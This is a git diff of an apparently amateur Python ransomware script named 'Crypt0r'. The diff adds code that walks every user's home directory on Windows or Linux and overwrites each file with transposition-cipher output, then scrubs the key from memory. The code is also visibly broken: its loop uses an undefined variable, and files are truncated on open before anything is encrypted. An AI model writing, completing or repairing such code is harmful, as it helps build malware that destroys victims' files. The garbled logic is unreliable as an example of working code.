@@ -1,10 +1,11 @@
 import getdirs
 import os
-import modify
 import hashlib as h
 import random as r
 import time as t
-import urllib.request
+#import urllib.request
+import transpositionEncrypt as te 
+import transpositionDecrypt as td
 
 def generateKey():
     keyName = "\x43\x72\x79\x70\x74\x30\x72" #Cypt0r in hexString
@@ -16,15 +17,31 @@ def generateKey():
     return encryptionKey #return it to the main function
 
 def main(encryptionKey):
-
+    
     key = encryptionKey
+    if os.name == "nt":
+        path = "C:/Users/"
+    else:
+        path = "/home/"
 
-    # TODO: encryption
+
+
+    files = getdirs.getdirs(path)
+
+        # TODO: encryption
+    for files in file:
+        f = open(files, "w+")
+        encrypted = te.encryptMessage(key,f)
+        f.write(encrypted)
+
+
 
     # clear the key out of memory 
     for k in range(1000):
         key = r.randint(1,86400)
         pass
+
+
 
 
 if __name__=="__main__":
